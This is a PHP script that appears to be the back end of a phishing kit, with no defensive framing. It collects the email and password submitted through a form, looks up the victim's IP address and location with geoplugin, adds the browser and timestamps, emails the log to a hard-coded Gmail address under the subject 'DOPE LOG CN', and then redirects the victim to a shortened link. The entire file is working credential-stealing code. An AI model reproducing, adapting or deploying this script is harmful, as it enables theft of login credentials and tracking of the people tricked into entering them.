<?php



require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "Referer: ".$_POST['referer']."\n";
$message .= "Host: ".$_POST['host']."\n";
$message .= "============= [ip] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'CHINA AUTO Logs';
$subj = "DOPE LOG CN ~ {$geoplugin->ip} ~ {$geoplugin->countryName}";
$from = "From: $domain<west>\n";
mail("susanging1141@gmail.com",$subj,$message,$from,$domain);


header("Location: https://goo.gl/447HV");